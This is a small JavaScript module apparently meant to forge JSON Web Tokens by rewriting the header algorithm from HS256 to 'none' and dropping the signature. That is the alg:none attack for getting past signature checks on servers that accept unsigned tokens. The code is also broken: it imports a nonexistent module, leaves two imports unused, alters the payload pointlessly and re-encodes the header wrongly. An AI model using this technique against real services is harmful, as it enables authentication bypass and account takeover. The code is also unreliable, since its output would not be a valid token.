import jwt from 'jsonwebtoken';
import helmet from 'helmet';
import base64 from 'base'

const malformer = (token) => {

    let [header, payload, signature] = token.split(".");

    const headerBufferDecode = new Buffer(header, 'base64');
    let malformedHeaderText = headerBufferDecode.toString('ascii').replace("HS256", "none");

    const payloadBufferDecode = new Buffer(payload, 'base64');
    let malformedPayloadText = payloadBufferDecode.toString('ascii').replace("HS256", "none");

    const headerBufferEcoder = new Buffer(malformedHeaderText, 'base64');
    let malformedHeaderBase64 = headerBufferEcoder.toString('base64');

    console.log(malformedHeaderBase64 + "." + payload + ".");
}

export default malformer;
